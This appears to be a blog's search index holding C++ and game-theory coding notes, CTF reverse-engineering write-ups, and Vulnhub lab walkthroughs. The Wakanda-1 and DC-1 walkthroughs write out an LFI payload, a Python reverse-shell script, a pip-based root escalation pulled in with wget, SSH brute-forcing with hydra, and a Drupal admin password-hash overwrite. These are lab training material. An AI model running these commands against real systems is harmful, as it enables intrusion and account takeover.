<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Use of string</title>
    <url>/2019/11/23/STL-string/</url>
    <content><![CDATA[<p><img src="https://boo-1258243870.cos.ap-beijing.myqcloud.com/green.jpg?q-sign-algorithm=sha1&q-ak=AKID80bw1qXkmUu86pR4qMbaIly8efT5sXP4&q-sign-time=1574529025;1574530825&q-key-time=1574529025;1574530825&q-header-list=&q-url-param-list=&q-signature=aa3c237a9be8a6db615abbb3e75243d336c8ea6a"></p>
<p>使用string应使用头文件:#include<string><br>必要时:#include<sstream></sstream></string></p>
<h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><blockquote class="blockquote-center">输入数据的每行包含若干个(至少一个)以空格隔开的整数，输出每行中所有整数和。</blockquote>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1000</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> line;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,line))&#123;</span><br><span class="line">		<span class="keyword">int</span> sum=<span class="number">0</span>,x;</span><br><span class="line">		<span class="function"><span class="built_in">stringstream</span> <span class="title">ss</span><span class="params">(line)</span></span>;</span><br><span class="line">		<span class="keyword">while</span>(ss&gt;&gt;x)</span><br><span class="line">			sum+=x;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用getline函数得到一行数据<span class="label danger">(string无须指定最大长度)</span>,用stringstream创建一个字符串流——ss,进行读取操作<br><img src="https://i.loli.net/2019/11/23/TNzQ4CHhqycikAY.png" alt="KZZ__L60_AMB__C_C9L___X.png"></p>
<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1>]]></content>
      <categories>
        <category>string</category>
      </categories>
      <tags>
        <tag>STL</tag>
        <tag>string</tag>
      </tags>
  </entry>
  <entry>
    <title>博弈问题</title>
    <url>/2019/11/12/%E5%8D%9A%E5%BC%88%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="Three-classic-ways-of-playing"><a href="#Three-classic-ways-of-playing" class="headerlink" title="Three classic ways of playing"></a>Three classic ways of playing</h1><ul>
<li><p><strong>Bash Game</strong><br>有1堆含n个石子，两个人轮流从这堆物品中取物，规定每次至少取1个，最多取m个。取走最后石子的人获胜。</p>
</li>
<li><p><strong>Nimm Game</strong><br>有k堆各n个石子，两个人轮流从某一堆取任意多的物品，规定每次至少取一个，多者不限。取走最后石子的人获胜。</p>
</li>
<li><p><strong>Wythoff Game</strong><br>有2堆各n个石子，两个人轮流从某一堆或同时从两堆中取同样多的物品，规定每次至少取1个，多者不限。取走最后石子的人获胜。</p>
</li>
</ul>
<p>奇异局势(平衡态)：任意非平衡态经过一次操作可以变为平衡态。每个玩家都会努力使自己抓完石子之后的局势为平衡，将这个平衡局势留给对方。因此，玩家A(先手)能够在初始为非平衡的游戏中取胜，玩家B能够在初始为平衡的游戏中取胜。</p>
<h1 id="Bash-Game"><a href="#Bash-Game" class="headerlink" title="Bash Game"></a>Bash Game</h1><h1 id="Nimm-Game"><a href="#Nimm-Game" class="headerlink" title="Nimm Game"></a>Nimm Game</h1><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,dif;</span><br><span class="line">    <span class="keyword">double</span> p=(<span class="built_in">sqrt</span>((<span class="keyword">double</span>)<span class="number">5</span>)+<span class="number">1</span>)/<span class="keyword">double</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b)</span><br><span class="line">    &#123;</span><br><span class="line">    dif=<span class="built_in">abs</span>(a-b);<span class="comment">//取差值</span></span><br><span class="line">    a=a&lt;b?a:b;<span class="comment">//取较小的值</span></span><br><span class="line">    <span class="keyword">if</span>(a==(<span class="keyword">int</span>)(p*dif))<span class="comment">//判断是不是奇异局势</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"0\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"1\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Wythoff-Game"><a href="#Wythoff-Game" class="headerlink" title="Wythoff Game"></a>Wythoff Game</h1><h2 id="code-1"><a href="#code-1" class="headerlink" title="code"></a>code</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i,sum,cnt;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)&amp;&amp;n)</span><br><span class="line">    &#123;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;p[i]);</span><br><span class="line">            sum^= p[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p[i]&gt;(sum^p[i]))</span><br><span class="line">                cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,cnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>博弈</category>
      </categories>
      <tags>
        <tag>博弈</tag>
      </tags>
  </entry>
  <entry>
    <title>UNCTF2019-re</title>
    <url>/2019/11/02/UNCTF%20%E7%AB%9E%E6%8A%80%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="0x01-babyXor"><a href="#0x01-babyXor" class="headerlink" title="0x01  babyXor"></a>0x01  babyXor</h1><p>题目下载地址：<a href="https://github.com/wowrice/REVERSE/blob/master/babyXor.exe" target="_blank" rel="noopener">https://github.com/wowrice/REVERSE/blob/master/babyXor.exe</a></p>
<p>简单的看一下题目：<img src="https://i.loli.net/2019/11/03/gTKXCt8VL5UzJRQ.png" alt="BC54@__VUH8E~HJ__BUP25P.png"></p>
<p>查壳：<img src="https://i.loli.net/2019/11/03/AzTdrgUb6escI8W.png" alt="___~F__O_RCG6PWKWR~__ZK.png"></p>
<p>od打开：<img src="https://i.loli.net/2019/11/03/ivbeGzoKFpElYat.png" alt="H_Z0T7_9W4DON2Z3KQP66EP.png"><br>虽然查壳工具没有查到壳，从od可以看出有壳（pushad加壳的关键句），继续手动脱壳<br><strong>F8</strong>运行pushad</p>
<p><img src="https://i.loli.net/2019/11/03/nkqsXymHfYDFMTg.png" alt="M_FGWDNO_73_JS3Q_SZ929P.png"></p>
<p>观察esp,给<strong>esp设置一个断点</strong><br><img src="https://i.loli.net/2019/11/03/rAd6JayONiCbutw.png" alt="_0@Y_5FKBR~6WO_XOKH9J_T.png"></p>
<p><strong>F9运行</strong>，程序停在如图位置<br><img src="https://i.loli.net/2019/11/03/GJXx9eankYmSiBo.png" alt="~8S9AR16_~_3YC3_U~_1USC.png"><br><strong>F8</strong>，显示代码<br><img src="https://i.loli.net/2019/11/03/4r5HhzmJqWATfOF.png" alt="BS5_X5TBRB`X4P9VYLPZ8_M.png](https://i.loli.net/2019/11/03/4r5HhzmJqWATfOF.png)
此处应该是程序的OEP，删除之前断点
![S__ZOX_VQ~VFDJJ7PU_H4A0.png](https://i.loli.net/2019/11/03/PU6h7FH4bQj8DJK.png)
脱壳
![BS5_X5TBRB`X4P9VYLPZ8_M.png"><br><img src="https://i.loli.net/2019/11/03/DzREHI81MjlytZO.png" alt="_S1_LMRWB@G1VMT0Z9K20~F.png"><br>脱壳完成后发现od无法再打开<br><img src="https://i.loli.net/2019/11/03/iQcP6jJKmtYLRM2.png" alt="QYG_O_AEUII3__G2__@_@EG.png"><br>使用工具<strong>imporREC</strong>进行修复<br><img src="https://i.loli.net/2019/11/03/e3fNqF26ixbjHGn.png" alt="RDPMNG_4XME_YOXID__IKMM.png"><br>如图就是修复后的文件：<img src="https://i.loli.net/2019/11/03/U41EVtqOJYLdCi6.png" alt="@7EEOW1_EP__~5KBBGF___Q.png"><br>继续进行od分析，<strong>F8</strong>大致跟一遍程序，发现程序运行到如下位置时弹出文字，<strong>F7</strong>跟入<br><img src="https://i.loli.net/2019/11/03/bp1T4qX3tBlHWCc.png" alt="_3DVR_T4DXIBQ1_`@S_Q_HL.png"></p>
<p><img src="https://i.loli.net/2019/11/03/PU6h7FH4bQj8DJK.png" alt="S__ZOX_VQ~VFDJJ7PU_H4A0.png"><br>一路<strong>F8</strong>，可得flag<br><img src="https://i.loli.net/2019/11/03/DZjSz54VNI93ebu.png" alt="TXS8GX01ADTS~V~__J~X0_1.png"></p>
<h1 id="0x02-666"><a href="#0x02-666" class="headerlink" title="0x02 666"></a>0x02 666</h1><p>题目下载地址：<a href="https://github.com/wowrice/REVERSE/blob/master/666" target="_blank" rel="noopener">https://github.com/wowrice/REVERSE/blob/master/666</a><br>拖入ida，如下图<br><img src="https://i.loli.net/2019/11/03/zaEQhKs1YbBSZ2o.png" alt="4B9MG_V@_OOUAQ3WL78C0KX.png"><br><img src="https://i.loli.net/2019/11/03/1LIDQrpUhZNf2BJ.png" alt="T_VR_9HCBZF84YQP_6O~L6E.png"><br><img src="https://i.loli.net/2019/11/03/plGXYK21Zj4Cz7A.png" alt="_W2_OE6@D~_Z__~_MU_P9N8.png"></p>
<p>可知encode加密后与enflag相同即可得到flag,观察enflag<br><img src="https://i.loli.net/2019/11/03/dswy7jcSQz8rDql.png" alt="_T_JP5A8H0U_~E@7LRIW__2.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">enflag=<span class="string">'izwhroz""w"v.K".Ni'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line">	flag+=chr((ord(enflag[i]) ^ <span class="number">18</span>)<span class="number">-6</span>)</span><br><span class="line">	flag+=chr((ord(enflag[i+<span class="number">1</span>]) ^ <span class="number">18</span>)+<span class="number">6</span>)</span><br><span class="line">	flag+=chr((ord(enflag[i+<span class="number">2</span>]) ^ <span class="number">18</span>) ^ <span class="number">6</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h1 id="OEP常见入口"><a href="#OEP常见入口" class="headerlink" title="OEP常见入口"></a>OEP常见入口</h1><p><strong>vc6.0</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">55    push ebp</span><br><span class="line">8BEC  mov ebp,esp</span><br><span class="line">6A FF push -1</span><br></pre></td></tr></table></figure>

<p><strong>delphi</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">55          PUSH EBP</span><br><span class="line">8BEC        MOV EBP,ESP</span><br><span class="line">83C4        F0 ADD ESP,-10</span><br><span class="line">B8 A86F4B00 MOV EAX,PE.004B6FA8</span><br></pre></td></tr></table></figure>

<p><strong>vc++</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">55      PUSH EBP</span><br><span class="line">8BEC    MOV EBP,ESP</span><br><span class="line">83EC 44 SUB ESP,44</span><br><span class="line">56      PUSH ESI</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub Wakanda靶机实践</title>
    <url>/2019/10/17/Vnlnhnb%20Wakanda-1/</url>
    <content><![CDATA[<h1 id="Wakanda-1-过程总结"><a href="#Wakanda-1-过程总结" class="headerlink" title="Wakanda-1 过程总结"></a>Wakanda-1 过程总结</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看本机IP：    ip a</span><br><span class="line"></span><br><span class="line">目标IP：    arp-scan -l</span><br><span class="line">全端口扫描：    nmap -sV -p- 192.168.56.101</span><br><span class="line">网站目录枚举：  dirb http://192.168.56.101</span><br><span class="line">网站漏洞扫描：  nikto -h http://192.168.56.101/</span><br><span class="line">在网站目录 cd /var/www/html/ </span><br><span class="line"></span><br><span class="line">LFI：   curl http://192.168.56.101/?lang=php://filter/convert.base64-encode/resource=index</span><br><span class="line"></span><br><span class="line">远程连接：ssh mamadou@192.168.56.101 -p 3333</span><br><span class="line">查看用户权限：  sudo -l</span><br><span class="line">python提示符界面：</span><br><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line"></span><br><span class="line">nc监听: nc -lvvp 5555</span><br><span class="line">建立简单的服务器：  python -m SimpleHTTPServer 8888</span><br><span class="line">查看是否还有其他用户：cat /etc/passwd</span><br><span class="line">查看用户文件：  find / -user devops 2&gt;/dev/null</span><br><span class="line">目的机新建文件：  mkdir fakepip 执行pip漏洞-&gt;cd fakepip</span><br><span class="line">从本地机下载：  wget http://192.168.0.104:8888/setup.py</span><br><span class="line">目的机下载set.up执行fakepip：   sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>

<h1 id="Wakanda-1"><a href="#Wakanda-1" class="headerlink" title="Wakanda-1"></a>Wakanda-1</h1><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>查看本机ip ，使用命令 ip a<br><img src="https://i.loli.net/2019/10/17/QJ7rlCpbEwfmoWO.png" alt="9_NO8_QA_M3S_LJ5N3~@MB0.png"><br>查找目标ip，使用命令arp-scan -l<br><img src="https://i.loli.net/2019/10/17/vsfaqpJBGHQClwW.png" alt="1_Q_KQN_8_I_9X___WJL1_R.png"><br>如图可知，目标ip为：192.168.56.101</p>
<h2 id="搜索信息"><a href="#搜索信息" class="headerlink" title="搜索信息"></a>搜索信息</h2><p>端口扫描：nmap -sV -p- 192.168.56.101<br><img src="https://i.loli.net/2019/10/17/uPg2FhVxnCKTaJ1.png" alt="CNJVOQV@DKZI@55W2_K@GQ4.png"><br>可知，80端口上开放一个WEB程序，3333端口运行SSH服务</p>
<p>目录枚举：dirb <a href="http://192.168.56.101" target="_blank" rel="noopener">http://192.168.56.101</a><br><img src="https://i.loli.net/2019/10/17/nUMd8V1D7v5Q4GW.png" alt="8_~K5L_2B_LZ@T_N0D_Z387.png"></p>
<p>扫描漏洞：nikto -h <a href="http://192.168.56.101/" target="_blank" rel="noopener">http://192.168.56.101/</a><br><img src="https://i.loli.net/2019/10/17/iDIZ7NKy3CqPEGT.png" alt="_9_R~_~____KAVIYV`SCWKL.png"></p>
<p>访问网页：<br><img src="https://i.loli.net/2019/10/17/O9RYGtojeM5H82c.png" alt="_Q_2___B___G1O__3HXJWQ8.png"><br>查看源码：<br><img src="https://i.loli.net/2019/10/17/TdChGqiOuKnfz53.png" alt="5_NE_0J1P8XITYZ7C89KXCK.png"><br>在注释中发现?lang=fr,在URL中添加此参数，发现网站切换语言为法语<br><img src="https://i.loli.net/2019/10/17/OClaAiFw39h5RLG.png" alt="_@TX3IM_MHQ900``CTY_VNX.png"><br>可能存在LFI（本地文件包含）或者RDL（远程文件包含）漏洞<br>可尝试一波LFI，借助curl工具，使用php filter伪协议来读取index文件源码<br>使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http://192.168.56.101/?lang=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/17/ptg1xcj6UN4PKH3.png" alt="37IQAJP3SW__Q6ZJSPGMRGM.png"><br>将读取的内容进行base64解码<br><img src="https://i.loli.net/2019/10/17/sKX9BlkgHY72Uuz.png" alt="_BE8NTD_7Y__01QIS@567IU.png"><br>得到password=’Niamey4Ever227!!!’  看到author为：mamadou<br>远程连接：ssh <a href="mailto:mamadou@192.168.56.101" target="_blank" rel="noopener">mamadou@192.168.56.101</a> -p 3333<br><img src="https://i.loli.net/2019/10/17/RGukMaBS42fL3es.png" alt="@R9H__W_B5F88_6N47M_9_P.png"><br>登陆成功后，得到一个python命令提示符界面，使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;import pty</span><br><span class="line">&gt;&gt;&gt;pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>

<p>进入系统的bash shell中，发现flag1<br><img src="https://i.loli.net/2019/10/17/6T7y3wQpZabHzqM.png" alt="FIBA11@K9G_U_PQ56L_XEV4.png"><br>在网站目录 使用命令：cd /var/www/html/ 下，也未找到有用的信息<br>查看当先mamadou用户是否有sudo权限<br><img src="https://i.loli.net/2019/10/17/9Z3klDbgqciOBvu.png" alt="E_U_J_374G_A_@7O7PV_29N.png"><br>查看是否还有其他用户：cat /etc/passwd<br><img src="https://i.loli.net/2019/10/17/XkBuljZdvH2rPCn.png" alt="MPZE@5WJ2X_JSISOG_R1ZTD.png"></p>
<p>查看devops用户，发现有flag2，但mamadou没有查看权限，查看一个特殊的py文件<br>使用命令：find / -user devops 2&gt;/dev/null<br><img src="https://i.loli.net/2019/10/17/adAvzEMLpYq3XGh.png" alt="_SPI_0_Z6N__TIQ_5_`L97A.png"><br>查看/tmp目录，发现一个test文件，是devops用户的，而且更新时间比较短，可知是一个定期运行的文件<br><img src="https://i.loli.net/2019/10/17/JLQU6xXjuo7iycW.png" alt="_BIIL_TAPH_ABOTXLP09XZD.png"></p>
<h2 id="使用反弹shell"><a href="#使用反弹shell" class="headerlink" title="使用反弹shell"></a>使用反弹shell</h2><p>修改.antivirus.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.56.101&quot;,5555))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/17/gGLoTEDudeJYklh.png" alt="_RY3RP_ZQYU87_`3IUAN@M6.png"></p>
<p>然后本地监听，等待脚本被执行<br>使用命令 nc -lvvp 5555<br><img src="https://i.loli.net/2019/10/17/15DA7I4OTXMwkYe.png" alt="UN_D8@ZM8`J_AOZJXXFMF~T.png"></p>
<p><img src="https://i.loli.net/2019/10/17/LakoTQSPgRlDzr1.png" alt="YU9_WUVT_YX85MI30O_GC_8.png"></p>
<h2 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h2><p>查看devops的sudo权限<br><img src="https://i.loli.net/2019/10/17/MDoNrKOGW92sYVg.png" alt="DKHNUSB0R54QK4_GKGF~@~K.png"><br>关于pip命令，可以利用fakepip：<a href="https://github.com/0x00-0x00/FakePip" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip</a><br>下载setup.py脚本后修改RHOST中的值和LPORT值，如图<br><img src="https://i.loli.net/2019/10/17/mCkVcDMf1HRiPXU.png" alt="_8QCGPC_~R~9MVW_~_02_DW.png"><br>利用python建立一个简单的HTTP服务器，在靶机上就可以从这个HTTP服务器下载脚本，利用命令：python -m SimpleHTTPServer 8888<br><img src="https://i.loli.net/2019/10/17/pKTskN27fehwRCb.png" alt="IHP2ANO35_YT@6DF2@LK_9D.png"><br>在靶机的devops用户下，下载setup.py<br>使用mkdir新建文件，使用wget下载py文件<br><img src="https://i.loli.net/2019/10/17/pVW3roa1Z9JnFSe.png" alt="`PH3_NCEM7_E~LAQC`_6W4L.png"><br>监听443端口：nc -lvvp 443<br><img src="https://i.loli.net/2019/10/17/692tM7hDbTfYiNx.png" alt="09Z3`TE`T~FKS0D_DF8_4UP.png"></p>
<p>在靶机上执行命令：sudo /usr/bin/pip install . –upgrade –force-reinstall<br><img src="https://i.loli.net/2019/10/17/7RzU1p9SJVP42Cf.png" alt="6TK``180C_WSMH9XFPNPRDA.png"><br>在kali上获得的反弹shell就是root权限<br><img src="https://i.loli.net/2019/10/17/n62FhL5CdAX8Kew.png" alt="_DH`Q___QBM_PGQB8P_3_KS.png"></p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhnb</tag>
        <tag>Wakanda</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub DC靶机实践</title>
    <url>/2019/10/14/Vulnhub%20DC-1/</url>
    <content><![CDATA[<h1 id="DC-1过程总结"><a href="#DC-1过程总结" class="headerlink" title="DC-1过程总结"></a>DC-1过程总结</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查找目标ip：     arp-scan -l</span><br><span class="line">全端口扫描：   nmap -sV -p- 192.168.75.134</span><br><span class="line">查找框架漏洞： msfconsose -&gt; search Drupal -&gt;use 漏洞名称</span><br><span class="line">   （drupal中的配置文件默认在 sites/defult/settings.php）</span><br><span class="line">用户数据库：   cat /etc/passwd</span><br><span class="line">用户密码使用hydra+john the ripper爆破: hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.128.139</span><br><span class="line">ssh远程连接：  ssh flag4@192.168.128.139</span><br><span class="line">mysql登陆：   mysql -u dbuser -p  -&gt;输入数据库密码</span><br><span class="line">数据库： show databases;</span><br><span class="line">        use drupaldb;</span><br><span class="line">        show tables;</span><br><span class="line">        select * from users;</span><br><span class="line">    (Drupal密码重置)update users set pass=&apos;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&apos; where uid=1;</span><br><span class="line">SUID提权：    find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>靶机下载地址：<br><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1,292/</a><br>下载后用vm打开,打开的时候默认的是桥接模式,因我的kali使用的是NAT，所以DC-1需要改成NAT<br><img src="https://i.loli.net/2019/10/14/ZVQL9K5jBEbFCmy.png" alt="_9QEXS81US___U__3~LN9FE.png"></p>
<h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p><img src="https://i.loli.net/2019/10/14/8g2twL4Szhy7o6e.png" alt="4_Y3ME6S`TE2EOFWH_0QP7O.png"></p>
<h2 id="查找主机ip"><a href="#查找主机ip" class="headerlink" title="查找主机ip"></a>查找主机ip</h2><blockquote>
<p>arp-scan -l</p>
</blockquote>
<p><img src="https://i.loli.net/2019/10/14/aTZnKyqNEVkprtX.png" alt="4F4438J~24_E1S1W46N__C0.png"></p>
<p>发现目标主机ip：192.168.128.139</p>
<h2 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h2><blockquote>
<p>nmap -sV -p- 192.168.128.139<br>-p-表示扫描0-65535的所有端口</p>
</blockquote>
<p><img src="https://i.loli.net/2019/10/14/4tp7kT95yih1Dnq.png" alt="@O~QV0AMNE_6ZJ0@2`7_GQ3.png"><br>如图,80端口open,我们可以访问网页</p>
<p><img src="https://i.loli.net/2019/10/14/GJfD6u3gdKv2o7F.png" alt="NYB_7YZW`2EP6D5_4JAH9MO.png"><br>可以发现此网页使用的是Drupal框架，使用kali的msfconsose可以自动化查找出一些框架的漏洞<br><img src="https://i.loli.net/2019/10/14/WaC95JgIfoAQUiH.png" alt="6~_H5VV5O6HU_8DTB_UFQ6L.png"><br>进行简单的初始化，就可以启动这个工具<br><img src="https://i.loli.net/2019/10/14/VAtTojnEgJyZHM9.png" alt="K9O_L_0NV__H59DGHF_NW_R.png"><br>直接使用命令</p>
<blockquote>
<p>search Drupal</p>
</blockquote>
<p><img src="https://i.loli.net/2019/10/14/YZzlCtMu5Lh79HS.png" alt="3U@7@`EGCW8DMWNY8A60_HX.png"><br>顺便找一个漏洞使用<br><img src="https://i.loli.net/2019/10/14/jpmKkqI1ryLohBV.png" alt="58U_P1MX806__4NVTGJ_EM6.png"></p>
<p>成功get shell,cat flag1<br><img src="https://i.loli.net/2019/10/14/KsPreYRhMIcOg7v.png" alt="WK5F_WS_2H_Z__J_C2VO__9.png"><br>flag1中提示查看配置文件,drupal中的配置文件默认在 sites/defult/settings.php<br><img src="https://i.loli.net/2019/10/14/xVY63Q2w1S7OJmk.png" alt="TI__XO13RG~3CQ~OYK_0WO1.png"><br>如图给出了数据库的账号和密码，但是在shell下的mysql无法打开<br>即使用 <strong>mysql -u dbuser -p</strong> 输入密码后无反应</p>
<h3 id="idea-1"><a href="#idea-1" class="headerlink" title="idea 1"></a>idea 1</h3><p>linux下有两个专门存放密码的路径<br><strong>/etc/passwd</strong> 是用户数据库，其中的域给出了用户名,加密口令和用户的其他信息。<br><strong>/etc/shadow</strong> 影子口令文件将/etc/passwd 文件中的加密口令移动到/etc/shadow中，只对超级用户root可读。</p>
<p>直接查看passwd的内容<br><img src="https://i.loli.net/2019/10/14/x9NPuHk5TJS3YF2.png" alt="I2_CVBU1_@P_WW_L7GUDN13.png"><br>发现flag4用户，使用hydra + john the ripper进行爆破</p>
<blockquote>
<p>下载：wget <a href="http://www.openwall.com/john/j/john-1.8.0.tar.gz" target="_blank" rel="noopener">http://www.openwall.com/john/j/john-1.8.0.tar.gz</a><br>解压：tar -xvf john-1.8.0.tar.gz<br>进入目录：cd john-1.8.0 &amp;&amp; cd src<br>选择操作系统：make -&gt; make clean linux-x86-64</p>
</blockquote>
<p><img src="https://i.loli.net/2019/10/14/5q3TtBhAF1SkI78.png" alt="S_8TRMC2T@~G_BSGCQ13Q3V.png"><br><img src="https://i.loli.net/2019/10/14/Fcq5nKtSBgTAI26.png" alt="QY8X5__MGS_~GU@~_J71GCX.png"></p>
<p>进行爆破</p>
<blockquote>
<p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.128.139</p>
</blockquote>
<p><img src="https://i.loli.net/2019/10/14/CatTvJ2BEDnHopW.png" alt="H_7IX_SS2@YNE~_RC3_RUP0.png"><br>得到flag4用户的密码为orange<br>通过ssh进行远程连接，再次尝试使用mysql的账号和密码登录<br><img src="https://i.loli.net/2019/10/14/BnjPJDFMCVhIUY7.png" alt="79AH_U_9I_LL0AB_YDQ7A6V.png"></p>
<p>通过mysql对数据库进行一波操作</p>
<blockquote>
<p>show databases;<br>use drupaldb;<br>show tables;<br>select * from users;</p>
</blockquote>
<p>database无果，尝试tables可看到users<br><img src="https://i.loli.net/2019/10/14/YBoVDJk5KGCWstx.png" alt="SLG~UN6AL_BQOGN@_U47036.png"></p>
<p><img src="https://i.loli.net/2019/10/14/gN4USrIVJ2WbPDX.png" alt="~5_P_HPYCZ5_M__@DR4~8I2.png"><br>得到admin的账号和密码，但是密码已经加密，重置drupal的密码，把管理员的密码字段改成  password的 SHA-512加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/14/xaUEl9KefM18HiP.png" alt="S__RJ_V9I6_2LXPV3__M7LD.png"></p>
<p>利用admin-password在网页进行登陆，浏览一下，即可发现flag3<br><img src="https://i.loli.net/2019/10/14/adJXBGhlunfiFjw.png" alt="UEC_8`NZ_26UOYYMQAQE_MF.png"><br><img src="https://i.loli.net/2019/10/14/4FmtCboAPnUjf8i.png" alt="S1MQF_665HFRX_~PI65KR_J.png"></p>
